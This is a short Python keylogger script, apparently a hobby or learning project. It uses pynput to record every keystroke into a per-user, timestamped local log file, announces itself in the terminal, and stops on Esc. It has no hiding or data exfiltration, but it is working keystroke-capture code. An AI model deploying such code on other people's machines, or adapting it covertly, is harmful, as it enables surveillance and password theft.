#!/usr/bin/env python3
#
# Keylogger coded by Jonathan Houle
# 20 Oct. 2022

from pynput import keyboard
from pathlib import Path
import getpass
from datetime import datetime

# Constants for creating the text file
CURRENT_OS_USER = getpass.getuser()
CURRENT_TIME_OBJECT = datetime.now()
CURRENT_TIME_STRING = CURRENT_TIME_OBJECT.strftime("%d-%b-%Y-%H:%M:%S")

REPERTORY_FOR_LOGS = "./logs/" + CURRENT_OS_USER + "/"
FILENAME = "keylogger_" + CURRENT_TIME_STRING

# Starting message
print("Keylogger activated.\nEverything will be saved in the folder logs under the name of :\n" + REPERTORY_FOR_LOGS + FILENAME)

# Creating folder for logs if it does not exist and creating the text file
Path(REPERTORY_FOR_LOGS).mkdir(parents=True, exist_ok=True)
file = open(REPERTORY_FOR_LOGS + FILENAME ,"w")

# Print keys input in terminal (Later, in a text file)
def on_pressing_key(key):
    try:
        print("{0}".format(key))
        if(key != keyboard.Key.esc):
            file.write("{0}".format(key))

    except AttributeError:
        print("{0}".format(key))

# To stop the listener
def on_key_release(key):
    if key == keyboard.Key.esc:
        file.close()
        print("Keylogger stopped.")
        return False

# Collecting events until released
with keyboard.Listener(
    on_press=on_pressing_key,
    on_release=on_key_release) as listener:
    listener.join()
